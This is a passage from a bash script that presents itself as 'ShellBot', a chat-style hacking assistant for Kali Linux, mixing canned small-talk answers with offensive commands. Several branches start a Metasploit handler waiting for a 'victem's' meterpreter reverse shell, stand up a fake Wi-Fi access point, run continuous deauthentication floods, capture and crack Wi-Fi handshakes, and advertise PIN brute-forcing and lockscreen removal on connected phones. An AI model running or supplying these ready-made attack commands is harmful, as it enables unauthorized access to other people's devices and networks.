	fi
	cd /var/www/html
	echo "[+] CHANGED DIRECTORY TO /VAR/WWW/HTML" | lolcat
        echo "[+] EXECUTING COMMANDS TO START HACKING..." | lolcat
        echo "[-] STARTING THE EXPLOIT..." | lolcat
        msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $own_ip; set LPORT 6666; run"
        echo "[+] PAYLOAD IS STARTED WAITING FOR VICTEM TO CONNECT..." | lolcat
        ;;
        19)
        echo "[+] CREATING DIRECTORY... " | lolcat
        mkdir ~/.themes
        mkdir ~/.icons
        cd ~/.themes
        echo "[+] DOWNLOADING ALL REQUIRED PACKAGES..." | lolcat
        echo "[+] DOWNLOADING SHELL FILE..."
        git clone https://github.com/B00merang-Project/macOS.git
        git clone https://github.com/B00merang-Project/macOS-Catalina-Dark.git
        echo "[+] INSTALLING PLANK..." | lolcat
        sudo apt install plank
        cd ~/.icons
        echo "[+] INSTALLING WGET..." | lolcat
        sudo apt install wget
        echo "[+] DOWNLOADING ICON PACK"
        wget https://github.com/keeferrourke/la-capitaine-icon-theme/archive/refs/tags/v0.6.2.zip
        echo "[+] UNZIPPING ICON PACK..."
        unzip v0.6.2.zip
        rm -i v0.6.2.zip
        echo "[+] DOWNLOADING IS COMPLETED..."
        echo "[+] OPENING GNOME-TWEAKS"
        echo "[+] THAT'S IT AS A TEXT BASED TOOL I CAN'T CHANGE THE THEME OF YOUR KALI MACHINE SO TO CHANGE THE APPEARANCE GO TO APPEARANCE THEN IN SHELL CHOOSE MAC OS, IN ICONS CHOOSE la-capitaine-icon-theme AND IN STARTUP APPS ADD A NEW APP AND ADD PLANK, GO TO THEMES AND DISABLE DASH-TO-DOCK DONE. THANKYOU."
        gnome-tweaks
        ;;
        "99")
        show_help
        add_commands
        ;;
        20)
	default_interface="wlan0"
    read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
	interface=${interface:-$default_interface}
    sudo airodump-ng $interface
        ;;
        21)
	default_bssid="D0:31:45:F3:D5:8D"
	default_name="WIFI POINT"
	default_interface="wlan0"

	read -p "Enter the name of the WiFi (default: $default_name): " name_of_wifi
	name_of_wifi=${name_of_wifi:-$default_name}
	echo "[+] WIFI NAME ==> $name_of_wifi" | lolcat

	read -p "Enter the BSSID (default: $default_bssid): " bssid
	bssid=${bssid:-$default_bssid}
	echo "[+] WIFI BSSID ==> $bssid" | lolcat
	read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
	interface=${interface:-$default_interface}
	echo "[+] INTERFACE ==> $interface" | lolcat
	airbase-ng -a $bssid --essid "$name_of_wifi" -c 5 $interface

	echo "[+] FAKE WIFI IS SUCCESSFULLY CREATED." | lolcat
        ;;
        "set monitor mode")
        default_interface="wlan0"
        interface=${interface:-$default_interface}
        read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
        sudo iwconfig $interface mode monitor
        echo "[+] CHANGED $interface TO MONITOR MODE."
        iwconfig
        ;;
        31)
	default_interface="wlan0"
    interface=${interface:-$default_interface}
    read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
    sudo airmon-ng check kill
    sudo airmon-ng start $interface
    echo "__________________________________________________________________________________________________________"
    sudo airmon-ng
        ;;
        32)
	    default_interface="wlan0"
        read -p "ENTER WHAT WILL BE THE NAME OF THE CAPTURE FILE: " nname
        read -p "ENTER THE CHANNEL OF WIFI: " channel
        read -p "ENTER BSSID OF YOUR WIFI: " nbssid
        read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
	    interface=${interface:-$default_interface}
        sudo airodump-ng -w $nname -c $channel --bssid $nbssid $interface
        ;;
        33)
        read -p "ENTER BSSID OF YOUR WIFI: " bssid
        read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
        sudo aireplay-ng --deauth 0 -a  $bssid $interface
        ;;
        22)
        read -p "ENTER THE NAME OF WIFI CAPTURE FILE {.cap FILE}: " capfile
        read -p "ENTER THE DESTINATION OR NAME OF WORDLIST TO CRACK: " wordlist
        aircrack-ng $capfile -w $wordlist
        ;;
        "pwd")
        pwd
        ;;
        23)
	default_bssid="D0:31:45:F3:D5:8D"
	default_name="WIFI POINT"
	default_interface="wlan0"
	interface=${interface:-$default_interface}
	read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
	echo "[+] TESTING PACKET INJECTION" | lolcat
	sudo aireplay-ng --test $interface
	read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
	echo "[+] MONITORING 5Ghz NETWORK NEAR YOU"
	sudo airodump-ng --band a $interface
        ;;
        "reboot")
        reboot
        ;;
        "set managed mode")
        default_interface="wlan0"
        interface=${interface:-$default_interface}
        read -p "Enter the interface (wlan0 or wlan1, default: $default_interface): " interface
        sudo iwconfig $interface mode managed
        echo "[+] CHANGED $interface TO MANAGED MODE."
        iwconfig
        ;;
        "install metasploit on termux")
	pkg update && pkg upgrade
	pkg install -U git python ruby wget
	cd
	wget https://github.com/rapid7/metasploit-framework/archive/master.zip
	unzip master.zip
	rm master.zip
	cd metasploit-framework-master
	./msfconsole
        ;;
        "scrcpy help")
        echo "[-] SORRY SIR IF YOU'RE FACING ISSUE RELATED TO SCRCPY" | lolcat
        echo "[+] SOLUTION 1:"| lolcat
        echo "[+] type: 'install scrcpy' TO INSTALL IT MAY BE THIS WILL HELP YOU" | lolcat
        echo "[-] SOLUTION 2: " | lolcat
        echo "[+] BE IN SAME NETWORK AND TRY ADB CONNECT [VICTEM'S IP]:[OPEN PORT OF VICTEM'S DEVICE]" | lolcat
        echo "[+] THANKYOU. IF STILL IT CAN'T HELP YOU THEN KINDLY JOIN OUR DISCORD TYPE 'links' FOR OUR DISCORD LINK ^-^ " | lolcat
        
        ;;
        "install scrcpy")
        sudo apt install git
        sudo apt install ffmpeg libsdl2-2.0-0 adb wget \
                 gcc git pkg-config meson ninja-build libsdl2-dev \
                 libavcodec-dev libavdevice-dev libavformat-dev libavutil-dev \
                 libswresample-dev libusb-1.0-0 libusb-1.0-0-dev
        git clone https://github.com/Genymobile/scrcpy.git
        cd scrcpy
        chmod +x *
	./install_release.sh
        ;;
        "iwconfig")
        iwconfig | lolcat
        ;;
        "ifconfig")
        ifconfig | lolcat
        ;;
        "open "*)
            software=${user_input#* }
            software_path=$(which $software)
            if [ -z "$software_path" ]
            then
                echo "Software not found"
            else
                xdg-open $software_path
            fi
            ;;
        "install bluetooth")
        echo "[+] INSTALLING BLUETOOTH DRIVERS" | lolcat
        sudo apt-get install bluetooth bluez bluez-tools rfkill -y
        echo "[+] STARTING BLUETOOTH SERVICES" | lolcat
        sudo systemctl start bluetooth
        sudo systemctl enable bluetooth
        sudo systemctl status bluetooth
        sudo rfkill unblock bluetooth
        echo "[+] INSTALLATION COMPLETED [✓] " | lolcat
        echo "[+] SCANING ALL AVAILABLE BLUETOOTH DEVICE" | lolcat
        hcitool scan
        ;;
        "install virtual box")
        echo "[+] INSTALLING VIRTUAL BOX FOR LINUX" | lolcat
        sudo apt install -y dkms linux-headers-$(uname -r)
        echo "[+] DOWNLOADING FILE..." | lolcat
        curl -fsSL https://www.virtualbox.org/download/oracle_vbox_2016.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/oracle_vbox_2016.gpg
	curl -fsSL https://www.virtualbox.org/download/oracle_vbox.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/oracle_vbox.gpg
	echo "[+] EXTRACTING FILE..." | lolcat
	echo "deb [arch=amd64] https://download.virtualbox.org/virtualbox/debian bullseye contrib" | sudo tee /etc/apt/sources.list.d/virtualbox.list
	echo "[+] INSTALLING..."
	sudo apt install -y virtualbox virtualbox-ext-pack
	echo "[+] INSTALLED VIRTUAL BOX COMPLETELY [✓]"
        ;;
        "i am sad")
        echo "i'd like to help. if you want me to try to cheer you up just write 'ok cheer me up'"
        ;;
        "show options")
	echo "[+] COMMANDS:" | lolcat
	echo "[1] 4-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[2] 6-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[3] 10-PIN BRUTE FORCE ATTACK" | lolcat
	echo "[4] DOWNLOAD ALL IMPORTANT TOOLS" | lolcat
	echo "[5] OPEN 5555 PORT OF CONNECT DEVICE" | lolcat
	echo "[6] IP DETAILS" | lolcat
	echo "[7] JUMP TO SCRCPY AND MONITOR ON CONNECT DEVICE" | lolcat
	echo "[8] REMOVE LOCKSCREEN" | lolcat
	echo "[10] INSTALL BASIC SOFTWARES" | lolcat
	echo "[11] INSTALL TELEGRAM,SPOTIFY" | lolcat
	echo "[12] INSTALL PACKAGES" | lolcat
    echo "[13] PHONEINFOS" | lolcat
    echo "[15] SCAN A WEBSTIE FOR PHISING PAGE" | lolcat
        echo "[+] ADDITIONAL COMMANDS ARE-:" | lolcat
        echo "[+] 'install chrome' TO INSTALL GOOGLE CHROME" | lolcat
        echo "[+] 'install edge' TO INSTALL MICROSOFT EDGE " | lolcat
        echo "[+] 'install virtual box' TO INSTALL VIRTUAL BOX" | lolcat
        echo "[+] 'install spotify' TO INSTALL SPOTIFY" | lolcat
        echo "[+] BOT TO PERSON COMMANDS" | lolcat
        echo -e "\n\n"
        ;;
        "help")
        show_help 
        add_commands
        ;;
        "ok cheer me up")
        echo "SIR YOU'RE THE BEST BECAUSE OF YOU I AM HERE, THANKYOU"
        ;;
        "links")
        echo "[+] DISCORD: https://discord.gg/M45DuEN5nH " | lolcat
        echo "[+] EMAIL: kanishkasingh0885@gmail.com" | lolcat
        echo "[+] YOUTUBE: https://www.youtube.com/channel/UCFL-IX_rxNY_AIFdYq4QtWw " | lolcat
        ;;
        "how are you")
            echo "I'm doing well, thank you! How about you?"
            ;;
        "what is your name")
            echo "My name is ShellBot. How can I assist you today?"
            ;;
        "tell me a joke")
            echo "Sure, here's a joke for you: Why don't scientists trust atoms? Because they make up everything!"
            ;;
        "goodbye")
            echo "Goodbye! It was nice talking to you."
            break
            ;;
        "you are dumb")
        echo "[+] SORRY SIR IF I HAVE DONE SOMETHING WRONG"
        ;;
        "i am a hacker")
        echo "oh wow sir, hackers are the one who can secure this world."
        ;;
        "where are you from")
            echo "I'm a digital assistant, so I don't have a physical location. But I'm here to help you!"
            ;;
        "what is the meaning of life")
            echo "Ah, the ultimate question! The meaning of life can vary from person to person. What do you think it is?"
            ;;
        "how old are you")
            echo "I'm a program, so I don't have an age like humans do. I'm always up-to-date!"
            ;;
        "what is hacking")
            echo "[+] Hacking is the process of gaining unauthorized access to a computer system or network. Hackers can use this access to steal data, install malware, or disrupt operations.";
        ;;

        "what is Linux")
            echo "[+] Linux is a free and open-source operating system. It is based on Unix and is used by millions of people around the world. Linux is known for its stability, security, and flexibility.";
        ;;

        "what is Kali Linux")
            echo "[+] Kali Linux is a penetration testing distribution of Linux. It is used by security professionals to test the security of computer systems and networks. Kali Linux includes a wide range of tools for penetration testing, such as Nmap, Wireshark, and Metasploit.";
        ;;

        "what is Gnome")
            echo "[+] Gnome is a graphical user interface (GUI) for Linux. It is one of the most popular GUIs for Linux and is used by many distributions, such as Ubuntu and Fedora.";
        ;;

        "what is LightDM")
            echo "[+] LightDM is a display manager for Linux. It is responsible for displaying the login screen and managing user sessions.";
        ;;

        "kali vs parrot")
            echo "[+] Kali Linux and Parrot OS are both penetration testing distributions of Linux. However, there are some key differences between the two distributions. Kali Linux is more focused on security testing, while Parrot OS is more focused on general-purpose use. Kali Linux also has a larger community of users and developers, while Parrot OS is a newer distribution with a smaller community.";
        ;;

        "black arch vs kali linux")
            echo "[+] BlackArch Linux and Kali Linux are both penetration testing distributions of Linux. However, there are some key differences between the two distributions. BlackArch Linux has a larger repository of tools than Kali Linux, while Kali Linux is more user-friendly. BlackArch Linux is also a newer distribution than Kali Linux, so it may not be as stable or secure.";
        ;;
        "types of linux")
            echo "[+] There are many different types of Linux distributions available. Some of the most popular distributions include Ubuntu, Fedora, Debian, and openSUSE. Each distribution has its own strengths and weaknesses, so it is important to choose a distribution that is right for your needs.";
        ;;
        "do you have any hobbies")
            echo "As a digital assistant, my purpose is to assist and provide information. So, my 'hobby' is helping people!"
            ;;
        "what's the weather like today")
            echo "I'm sorry, I don't have real-time information. But you can check a weather website or app to get the current weather updates."
            ;;
        "types of hacking")
        echo "[+] Brute force attacks: This involves trying every possible combination of characters until the correct password is found.

[+] Dictionary attacks: This involves using a list of common passwords to try to gain access to a system.

[+] Social engineering attacks: This involves tricking the victim into giving up their personal information or clicking on a malicious link.

[+] Phishing attacks: This involves sending emails or text messages that appear to be from a legitimate source, such as a bank or credit card company. The emails or text messages will often contain a link that, when clicked, will take the victim to a fake website that looks like the real website.
 Once the victim enters their personal information on the fake website, the hacker can steal it.
[+] Malware attacks: This involves installing malware on a victim's computer. Malware can be installed through a variety of ways,
 such as clicking on a malicious link, opening an infected attachment, 
or downloading a file from an untrusted source. Once malware is installed on a computer,
 it can steal data, install other malware, or disrupt operations."
        ;;
        "do you like music")
            echo "I don't have personal preferences, but I can definitely help you find information about different types of music!"
            ;;
        "what is the capital of France")
            echo "The capital of France is Paris, known as the 'City of Love' and famous for its iconic landmarks like the Eiffel Tower."
            ;;
        "recommend a good book")
            echo "One highly recommended book is 'The Alchemist' by Paulo Coelho. It's a philosophical novel about following one's dreams."
            ;;
        "how can I learn programming")
            echo "Learning programming can be a rewarding journey! You can start with online tutorials, coding courses, or coding bootcamps."
            ;;
        "tell me about yourself")
            echo "I'm an AI-powered digital assistant designed to help answer questions and engage in conversations. How can I assist you today?"
            ;;
        "what's your favorite movie")
            echo "As an AI, I don't have personal preferences, so I don't have a favorite movie. But I can recommend popular movies if you'd like!"
            ;;
        "what's the time")
            echo "I'm sorry, I don't have access to real-time data. You can check the time on your device or search for 'current time' online."
            ;;
        "how do I cook pasta")
            echo "Cooking pasta is quite simple! Boil water, add salt, cook the pasta until it's al dente, and then drain it. Don't forget the sauce!"
            ;;
        "tell me a famous quote")
            echo "Here's a quote by Albert Einstein: 'Imagination is more important than knowledge.'"
            ;;
        "what's your favorite color")
            echo "As an AI, I don't perceive colors the way humans do, so I don't have a favorite color. But colors can be fascinating, right"
            ;;
        "What is a lever")
        echo "A lever is a simple machine that consists of a rigid bar that pivots about a fixed point, called a fulcrum. It is used to transmit and enhance force or motion."
            ;;
        "What is photosynthesis")
            echo "Photosynthesis is the process by which green plants and some other organisms use sunlight to synthesize foods with the help of chlorophyll pigments. In general, photosynthesis is the conversion of light energy into chemical energy."
            ;;
        "What is an atom")
            echo "An atom is the basic unit of a chemical element. It consists of a nucleus containing protons and neutrons, surrounded by electrons in shells."
        ;;
        "What is gravity")
            echo "Gravity is the force by which a planet or other body draws objects toward its center. The force of gravity keeps all of the planets in orbit around the sun."
        ;;
        "What is a cell")
            echo "A cell is the basic unit of life. All living organisms are composed of one or more cells. Cells are the building blocks of tissues and organs in multicellular organisms."
        ;;
        "What is DNA")
            echo "DNA (deoxyribonucleic acid) is a molecule that carries the genetic instructions used in the growth, development, functioning and reproduction of all known living organisms and many viruses."
        ;;
        "What is evolution")
            echo "Evolution is the process by which different kinds of living organisms are thought to have developed and diversified from earlier forms during the history of the earth."
        ;;
        "What is a black hole")
            echo "A black hole is a region of spacetime exhibiting gravitational acceleration so strong that nothing—no particles or even electromagnetic radiation such as light—can escape from it."
        ;;
        "what is the terminal in kali linux")
            echo "[+] The terminal is a command-line interface (CLI) that allows you to interact directly with the operating system. You can use the terminal to run commands, manage files, and troubleshoot problems."
        ;;

        "what is the best tool for hackers")
            echo "[+] There is no one-size-fits-all answer to this question. The best tool for hackers will vary depending on the specific task they are trying to accomplish. However, some of the most popular tools for hackers include Nmap, Wireshark, and Metasploit."
        ;;

        "how do i learn ethical hacking")
            echo "[+] There are many resources available to help you learn ethical hacking. You can find books, articles, and tutorials online. You can also find ethical hacking courses and boot camps. The most important thing is to start learning and practicing as soon as possible."
        ;;
        "what is a black hat hacker")
        echo "[+] A black hat hacker is a hacker who gains unauthorized access to a computer system or network with the intent to harm or steal data. Black hat hackers are often motivated by financial gain or political ideology."
        ;;

        "what is a white hat hacker")
        echo "[+] A white hat hacker is a hacker who gains unauthorized access to a computer system or network with the intent to improve security. White hat hackers are often employed by security companies or government agencies to test the security of their systems."
        ;;

        "what is a grey hat hacker")
        echo "[+] A grey hat hacker is a hacker who falls somewhere between black hat and white hat hackers. Grey hat hackers may gain unauthorized access to a computer system or network without permission, but they do not intend to harm or steal data. Grey hat hackers often share their findings with the system owners in order to help them improve their security."
        ;;

        "what is a script kiddie")
        echo "[+] A script kiddie is a hacker who uses pre-made tools and scripts to attack computer systems. Script kiddies are often unskilled and inexperienced, and they often target vulnerable systems. Script kiddies are not typically considered to be serious threats to security."
        ;;

        "what is a nation state actor")
        echo "[+] A nation state actor is a government-funded group that uses hacking to achieve political or economic goals. Nation state actors are often very sophisticated and well-funded, and they pose a serious threat to security."
        ;;

        "what is a botnet")
        echo "[+] A botnet is a network of computers that have been infected with malware and are controlled by a single attacker. Botnets can be used to carry out a variety of attacks, including denial-of-service attacks, spam campaigns, and data theft."
        ;;

        "what is a DDoS attack?")
        echo "[+] A DDoS attack is a distributed denial-of-service attack. In a DDoS attack, a large number of computers are used to flood a target website or server with requests, making it impossible for legitimate users to access it. DDoS attacks can be used to bring down websites, disrupt businesses, and interfere with critical infrastructure."
        ;;

        "what is a phishing attack?")
        echo "[+] A phishing attack is a type of social engineering attack in which the attacker sends an email or text message that appears to be from a legitimate source. The email or text message will often contain a link that, when clicked, will take the victim to a fake website that looks like the real website. Once the victim enters their personal information on the fake website, the attacker can steal it."
        ;;
        "what are some of the ethical hacking certifications available")
            echo "[+] There are many ethical hacking certifications available. Some of the most popular certifications include the Certified Ethical Hacker (CEH), the Offensive Security Certified Professional (OSCP), and the Certified Information Systems Security Professional (CISSP). These certifications can help you demonstrate your skills and knowledge to potential employers."
        ;;

        "how can I stay up-to-date on the latest hacking techniques")
            echo "[+] The best way to stay up-to-date on the latest hacking techniques is to read security blogs and articles, attend security conferences, and participate in security mailing lists and forums. You can also follow security researchers on Twitter and other social media platforms."
        ;;
        "what is electricity")
            echo "Electricity is a form of energy resulting from the movement of charged particles (such as electrons or protons), typically through a wire or other conductor."
        ;;
        "what is a molecule")
            echo "A molecule is an electrically neutral group of two or more atoms held together by chemical bonds. Molecules are distinguished from ions by their lack of electrical charge."
        ;;
        "what is a chemical reaction")
            echo "A chemical reaction is a process that leads to the transformation of one set of chemical substances to another. Chemical reactions can be represented by chemical equations."
        ;;
        "i am in which file")
        newdestination= echo "[+] YOUR DESTINATION:" && pwd
        $newdestination
        ;;
        "tell me my destination")
        newdestination= echo "[+] YOUR DESTINATION:" && pwd
        $newdestination
        ;;
        "What is an ecosystem")
            echo "An ecosystem is a community of living organisms in conjunction with the nonliving components of their environment (things like air, water and mineral soil), interacting as a system."
        ;;
        "What is climate change")
            echo "Climate change refers to long-term changes in the Earth's climate, including temperature, precipitation, and wind patterns. It can be caused by natural factors or human activities that release greenhouse gases into the atmosphere."
        ;;
        "What is photosynthesis")
            echo "Photosynthesis is the process by which green plants and some other organisms use sunlight to synthesize foods with the help of chlorophyll pigments. In general, photosynthesis is the conversion of light energy into chemical energy."
        ;;
        "What are fossils")
            echo "Fossils are the preserved remains or traces of animals, plants, and other organisms from the remote past. They provide evidence about how life on Earth has changed over time."
        ;;
        "What are renewable resources")
            echo "Renewable resources are natural resources that can be replenished over time through natural processes. Examples include solar energy, wind energy, and biomass."
        ;;
        "What are nonrenewable resources")
            echo "Nonrenewable resources are natural resources that cannot be replenished within a human lifetime. Examples include fossil fuels such as coal, oil, and natural gas."
        ;;
        "What are genes")
            echo "Genes are segments of DNA that contain the instructions for making proteins. Proteins determine many traits in an organism such as eye color and blood type."
        ;;
        "exit")
	chars="/-\|"
	timeout=3
	start=$(date +%s)
	
	while :; do
	  for (( i=0; i<${#chars}; i++ )); do
	    sleep 0.1
	    echo -en "\r [+] SHUTTING DOWN...${chars:$i:1}" | lolcat
	    now=$(date +%s)
	    elapsed=$((now-start))
	    if [[ $elapsed -ge $timeout ]]; then
	      echo ""
	      break 2 # break out of both loops
	    fi
	  done
	done
	exit
        ;;
        "restart")
        exit
        ./X.sh
        ;;
        "What are chromosomes")
            echo "Chromosomes are long, threadlike structures located inside the nucleus of animal and plant cells. Each chromosome contains many genes. In humans, there are 23 pairs of chromosomes for a total of 46 chromosomes."
        ;;
    "usr")
        read -p "[+] ENTER THE NEW USERNAME: " username
        # Export the new username as an environment variable
        export username
        ;;
        "how you can help me")
           echo "I AM A BASIC SHELL BASED VIRTUAL ASSISTANT, I CAN BRUTE FORCE A CONNECTED DEVICE"
        ;;
        "clear")
        clear
        ;;
        *)
            echo "I'm sorry, I don't understand. Can you please rephrase your question or command?"
            ;;

    esac
}
while true; do
    echo -e "\n\n"
    echo -e "\033[34m┌──[$ AVSUS㉿$username]-[v2.1]\033[0m"
    read -p "└──[$] " input 
    process_input "$input"
done